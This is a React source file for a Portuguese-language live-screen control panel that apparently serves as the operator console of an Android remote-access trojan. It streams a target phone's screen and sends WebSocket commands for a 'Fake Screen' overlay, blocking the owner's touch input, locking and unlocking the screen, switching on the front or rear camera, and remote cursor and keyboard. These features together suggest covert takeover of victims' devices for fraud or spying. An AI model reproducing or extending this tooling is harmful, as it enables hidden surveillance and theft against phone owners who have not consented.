import { useEffect, useRef, useState } from "react";
import { useLocation, useParams } from "wouter";
import { useAuth } from "@/lib/auth";
import { useDeviceWebSocket } from "@/hooks/use-websocket";
import {
  Settings, Type, Camera, LayoutGrid, Eye,
  MousePointer, Lock, LockOpen, Keyboard,
  Shield, Volume2, VolumeX, Monitor, Play, StopCircle,
  ChevronLeft, ChevronDown, Wifi, Battery, Smartphone,
  RefreshCw, Maximize2, RotateCcw, Ban, Check,
} from "lucide-react";

interface Device {
  id: string; name: string; battery: number; version: string;
}
const DEVICES: Record<string, Device> = {
  d1: { id: "d1", name: "Samsung Galaxy A54",   battery: 78, version: "v4.5.4" },
  d2: { id: "d2", name: "Motorola Edge 30",      battery: 42, version: "v4.5.4" },
  d3: { id: "d3", name: "Xiaomi Redmi Note 12",  battery: 10, version: "v4.5.3" },
};

interface ToolDef {
  id: string;
  icon: React.ElementType;
  label: string;
  cmd?: string;
  toggle?: boolean;
  danger?: boolean;
  divider?: boolean;
}

const LIVE_TOOLS: ToolDef[] = [
  // ── Remote control actions (send WS commands) ──
  { id: "eye",      icon: Eye,         label: "Fake Screen",      cmd: "toggle_overlay",     toggle: true  },
  { id: "ban",      icon: Ban,         label: "Bloquear Touch",   cmd: "toggle_touch_block", toggle: true, danger: true },
  { id: "lock",     icon: Lock,        label: "Bloquear Tela",    cmd: "lock_screen"    },
  { id: "lockopen", icon: LockOpen,    label: "Desbloquear Tela", cmd: "unlock_screen"  },
  { id: "camera-f", icon: Camera,      label: "Câmera Frontal",   cmd: "camera_front",       toggle: true  },
  { id: "camera-b", icon: RotateCcw,   label: "Câmera Traseira",  cmd: "camera_back",        toggle: true  },
  // ── Other panel tools ──
  { id: "settings", icon: Settings,    label: "Configurações", divider: true },
  { id: "text",     icon: Type,        label: "Texto" },
  { id: "grid",     icon: LayoutGrid,  label: "Grid" },
  { id: "cursor",   icon: MousePointer,label: "Cursor Remoto" },
  { id: "keyboard", icon: Keyboard,    label: "Teclado" },
  { id: "shield",   icon: Shield,      label: "Proteção" },
  { id: "volume",   icon: Volume2,     label: "Volume" },
  { id: "mute",     icon: VolumeX,     label: "Mudo" },
  { id: "monitor",  icon: Monitor,     label: "Monitor" },
];

function BatteryIcon({ pct }: { pct: number }) {
  const color = pct > 30 ? "text-[#00ff9d]" : pct > 15 ? "text-yellow-400" : "text-red-400";
  return (
    <span className={`flex items-center gap-0.5 text-[10px] font-mono font-bold ${color}`}>
      <Battery className="w-3 h-3" />{pct}%
    </span>
  );
}

export default function LiveScreen() {
  const { isAuthenticated } = useAuth();
  const [, setLocation]     = useLocation();
  const params   = useParams<{ deviceId: string }>();
  const deviceId = params.deviceId ?? "d1";
  const device   = DEVICES[deviceId] ?? { id: deviceId, name: "Dispositivo", battery: 0, version: "v0.0.0" };

  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Toggle state for tools that maintain on/off state
  const [activeTools, setActiveTools] = useState<Set<string>>(new Set());
  // Brief feedback toast after sending a command
  const [cmdFeedback,  setCmdFeedback]  = useState<string | null>(null);
  const feedbackTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const { status, frameUrl, stats, startStream, stopStream, streaming, sendCommand } =
    useDeviceWebSocket(deviceId);

  useEffect(() => {
    if (!frameUrl || !canvasRef.current) return;
    const img = new Image();
    img.onload = () => {
      const canvas = canvasRef.current;
      if (!canvas) return;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;
      canvas.width  = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
    };
    img.src = frameUrl;
  }, [frameUrl]);

  useEffect(() => {
    if (!isAuthenticated) setLocation("/login");
  }, [isAuthenticated, setLocation]);

  if (!isAuthenticated) return null;

  const wsConnected  = status === "connected";
  const wsConnecting = status === "connecting";

  function handleTool(tool: ToolDef) {
    if (!tool.cmd) return;

    const isCurrentlyActive = activeTools.has(tool.id);

    // Send WebSocket command to the Android device
    sendCommand(tool.cmd, { targetDeviceId: deviceId });

    // Update toggle state
    if (tool.toggle) {
      setActiveTools(prev => {
        const next = new Set(prev);
        if (next.has(tool.id)) next.delete(tool.id); else next.add(tool.id);
        return next;
      });
    }

    // Feedback toast
    const verb = tool.toggle
      ? (isCurrentlyActive ? "Desativado" : "Ativado")
      : "Enviado";
    const label = `${verb}: ${tool.label}`;
    setCmdFeedback(label);
    if (feedbackTimer.current) clearTimeout(feedbackTimer.current);
    feedbackTimer.current = setTimeout(() => setCmdFeedback(null), 2500);
  }

  return (
    <div className="flex h-screen w-full bg-[#080c14] text-foreground overflow-hidden">

      {/* ── Left Sidebar ── */}
      <aside className="w-[52px] flex-shrink-0 bg-[#0a0e1a] border-r border-primary/10 flex flex-col items-center gap-0.5 py-2 z-20 overflow-y-auto">
        {LIVE_TOOLS.map(tool => {
          const isOn     = activeTools.has(tool.id);
          const isDanger = tool.danger && isOn;
          return (
            <div key={tool.id} className="w-full flex flex-col items-center">
              {tool.divider && <div className="w-7 h-px bg-primary/10 my-1" />}
              <button
                title={tool.label}
                onClick={() => handleTool(tool)}
                className={`relative w-9 h-9 rounded-lg flex items-center justify-center transition-all
                  ${isDanger
                    ? "text-red-400 bg-red-500/15 shadow-[0_0_10px_rgba(239,68,68,0.35)]"
                    : isOn && tool.toggle
                      ? "text-primary bg-primary/20 shadow-[0_0_10px_rgba(0,212,255,0.4)] border border-primary/30"
                      : tool.cmd
                        ? "text-muted-foreground/60 hover:text-primary hover:bg-primary/10 border border-transparent"
                        : "text-muted-foreground/40 hover:text-primary/60 hover:bg-primary/8 border border-transparent"
                  }`}
              >
                <tool.icon className="w-4 h-4" />
                {/* Active indicator dot */}
                {isOn && tool.toggle && (
                  <span className={`absolute -top-0.5 -right-0.5 w-2 h-2 rounded-full border border-[#0a0e1a]
                    ${isDanger ? "bg-red-400 shadow-[0_0_5px_rgba(239,68,68,0.8)]" : "bg-primary shadow-[0_0_5px_rgba(0,212,255,0.9)]"}`} />
                )}
              </button>
            </div>
          );
        })}
      </aside>

      {/* ── Main ── */}
      <main className="flex-1 flex flex-col overflow-hidden">

        {/* ── Top Bar ── */}
        <div className="flex items-center gap-2 px-3 py-2 border-b border-primary/10 bg-[#0a0e1a]/90 backdrop-blur flex-shrink-0 flex-wrap gap-y-1.5">

          {/* Title */}
          <div className="flex items-center gap-2 min-w-0">
            <span className="flex items-center gap-1.5">
              <span className={`w-2 h-2 rounded-full transition-colors
                ${wsConnected ? "bg-[#00ff9d] shadow-[0_0_6px_rgba(0,255,157,0.8)]"
                  : wsConnecting ? "bg-yellow-400 animate-pulse" : "bg-red-500/60"}`} />
              <span className="font-orbitron text-xs font-bold text-primary tracking-widest whitespace-nowrap"
                style={{ textShadow: "0 0 8px rgba(0,212,255,0.6)" }}>
                TELA AO VIVO
              </span>
              <ChevronDown className="w-3 h-3 text-primary/50" />
            </span>
            <span className="text-muted-foreground/50 text-xs hidden sm:block">|</span>
            <span className="text-xs text-muted-foreground/70 font-medium truncate hidden sm:block max-w-[160px]">
              {device.name}
            </span>
          </div>

          {/* INICIAR / PARAR STREAM */}
          {!streaming ? (
            <button onClick={startStream}
              className="flex items-center gap-1.5 h-8 px-4 rounded-lg border border-primary/60 bg-primary/10 text-primary text-xs font-orbitron font-bold tracking-wider hover:bg-primary/20 transition-all"
              style={{ boxShadow: "0 0 12px rgba(0,212,255,0.2), inset 0 0 8px rgba(0,212,255,0.05)" }}>
              <Play className="w-3.5 h-3.5 fill-current" />
              INICIAR STREAM
            </button>
          ) : (
            <button onClick={stopStream}
              className="flex items-center gap-1.5 h-8 px-4 rounded-lg border border-red-500/60 bg-red-500/10 text-red-400 text-xs font-orbitron font-bold tracking-wider hover:bg-red-500/20 transition-all">
              <StopCircle className="w-3.5 h-3.5" />
              PARAR STREAM
            </button>
          )}

          {/* Stats */}
          <div className="flex items-center gap-3 ml-1">
            <span className="flex items-center gap-1 text-[10px] font-mono text-muted-foreground/60">
              <Play className="w-2.5 h-2.5 text-primary/40" />
              <span className="text-foreground/70 font-bold">{stats.fps}</span>
              <span className="text-muted-foreground/40">FPS</span>
            </span>
            <span className="flex items-center gap-1 text-[10px] font-mono text-muted-foreground/60">
              <Wifi className="w-2.5 h-2.5 text-primary/40" />
              <span className={`font-bold ${stats.latencyMs < 50 ? "text-[#00ff9d]" : stats.latencyMs < 150 ? "text-yellow-400" : "text-red-400"}`}>
                {stats.latencyMs}ms
              </span>
            </span>
            <BatteryIcon pct={device.battery} />
            <span className="flex items-center gap-1 text-[10px] font-orbitron">
              <span className={`w-1.5 h-1.5 rounded-full ${wsConnected ? "bg-[#00ff9d] shadow-[0_0_4px_rgba(0,255,157,0.8)]" : "bg-red-500/60"}`} />
              <span className={wsConnected ? "text-[#00ff9d]/70" : "text-red-500/50"}>WS</span>
            </span>
          </div>

          <div className="flex-1" />

          {/* Command feedback toast */}
          {cmdFeedback && (
            <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-lg border border-[#00ff9d]/30 bg-[#00ff9d]/8 text-[10px] font-orbitron text-[#00ff9d] tracking-wider animate-in fade-in duration-200">
              <Check className="w-3 h-3" />
              {cmdFeedback}
            </div>
          )}
        </div>

        {/* ── Stream Area ── */}
        <div className="flex-1 relative overflow-hidden bg-[#050810]">

          {/* Live canvas */}
          {streaming && frameUrl && (
            <canvas ref={canvasRef}
              className="absolute inset-0 w-full h-full object-contain"
              style={{ imageRendering: "pixelated" }} />
          )}

          {/* Empty / waiting state — NO "AGUARDANDO STREAM" text */}
          {(!streaming || !frameUrl) && (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-6">
              {/* Phone icon with pulsing rings */}
              <div className="relative">
                <div className="w-20 h-20 rounded-2xl border border-primary/20 bg-primary/5 flex items-center justify-center"
                  style={{ boxShadow: "0 0 30px rgba(0,212,255,0.08)" }}>
                  <Smartphone className="w-10 h-10 text-primary/40"
                    style={{ filter: "drop-shadow(0 0 8px rgba(0,212,255,0.4))" }} />
                </div>
                {[0, 1, 2].map(i => (
                  <div key={i}
                    className="absolute rounded-2xl border border-primary/10 animate-ping"
                    style={{ inset: `-${(i + 1) * 10}px`, animationDelay: `${i * 400}ms`, animationDuration: "2s" }} />
                ))}
              </div>

              {/* "Pressione PLAY para Iniciar" */}
              <p className="text-xs text-muted-foreground/50 flex items-center gap-1.5 justify-center">
                Pressione
                <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded border border-primary/30 bg-primary/10 text-primary text-[9px] font-orbitron">
                  <Play className="w-2.5 h-2.5 fill-current" />PLAY
                </span>
                para Iniciar
              </p>

              {/* INICIAR STREAM centre button */}
              <button onClick={startStream}
                className="flex items-center gap-2 h-11 px-8 rounded-xl border border-primary/50 bg-primary/10 text-primary text-sm font-orbitron font-bold tracking-wider hover:bg-primary/20 transition-all"
                style={{ boxShadow: "0 0 20px rgba(0,212,255,0.15), inset 0 0 10px rgba(0,212,255,0.05)" }}>
                <Play className="w-4 h-4 fill-current" />
                INICIAR STREAM
              </button>

              {wsConnecting && (
                <p className="text-[10px] text-yellow-400/60 font-mono animate-pulse">Conectando ao WebSocket...</p>
              )}
              {!wsConnected && !wsConnecting && (
                <p className="text-[10px] text-red-400/60 font-mono">WebSocket desconectado — tentando reconectar...</p>
              )}
            </div>
          )}

          {/* AO VIVO badge */}
          {streaming && (
            <div className="absolute top-2 left-2 flex items-center gap-1.5 px-2 py-1 rounded bg-black/60 backdrop-blur border border-red-500/30">
              <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse shadow-[0_0_6px_rgba(239,68,68,0.8)]" />
              <span className="text-[9px] font-orbitron text-red-400 tracking-widest">AO VIVO</span>
            </div>
          )}

          {/* Active control badges (centre-top) */}
          {activeTools.size > 0 && (
            <div className="absolute top-2 left-1/2 -translate-x-1/2 flex items-center gap-1.5 flex-wrap justify-center">
              {activeTools.has("ban") && (
                <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-red-500/20 border border-red-500/40 text-[9px] font-orbitron text-red-400">
                  <Ban className="w-2.5 h-2.5" />TOUCH BLOQUEADO
                </span>
              )}
              {activeTools.has("eye") && (
                <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-primary/20 border border-primary/40 text-[9px] font-orbitron text-primary">
                  <Eye className="w-2.5 h-2.5" />FAKE SCREEN
                </span>
              )}
              {activeTools.has("camera-f") && (
                <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-primary/20 border border-primary/40 text-[9px] font-orbitron text-primary">
                  <Camera className="w-2.5 h-2.5" />CAM FRONTAL
                </span>
              )}
              {activeTools.has("camera-b") && (
                <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-primary/20 border border-primary/40 text-[9px] font-orbitron text-primary">
                  <RotateCcw className="w-2.5 h-2.5" />CAM TRASEIRA
                </span>
              )}
            </div>
          )}

          {/* Top-right: refresh + fullscreen */}
          <div className="absolute top-2 right-2 flex items-center gap-1">
            <button
              onClick={() => { if (streaming) { stopStream(); setTimeout(startStream, 300); } }}
              title="Reiniciar stream"
              className="w-7 h-7 rounded bg-black/50 backdrop-blur border border-primary/20 text-muted-foreground/60 hover:text-primary flex items-center justify-center transition-all">
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
            <button title="Tela cheia"
              className="w-7 h-7 rounded bg-black/50 backdrop-blur border border-primary/20 text-muted-foreground/60 hover:text-primary flex items-center justify-center transition-all">
              <Maximize2 className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        {/* ── Bottom Navigation ── */}
        <div className="flex items-center px-3 py-2 border-t border-primary/10 bg-[#0a0e1a]/80 flex-shrink-0">
          <button onClick={() => setLocation("/")}
            className="flex items-center gap-1.5 h-8 px-3 rounded-lg border border-primary/20 text-primary/60 hover:text-primary hover:border-primary/40 hover:bg-primary/10 text-xs font-orbitron tracking-wider transition-all">
            <ChevronLeft className="w-3.5 h-3.5" />
            VOLTAR
          </button>
          <div className="flex-1 flex items-center justify-center gap-2">
            <span className="text-[10px] text-muted-foreground/40 font-mono truncate max-w-[200px]">{device.name}</span>
            <span className="text-muted-foreground/20 text-[10px]">·</span>
            <span className="text-[10px] text-primary/40 font-mono">{device.version}</span>
          </div>
          <div className="w-20" />
        </div>
      </main>
    </div>
  );
}
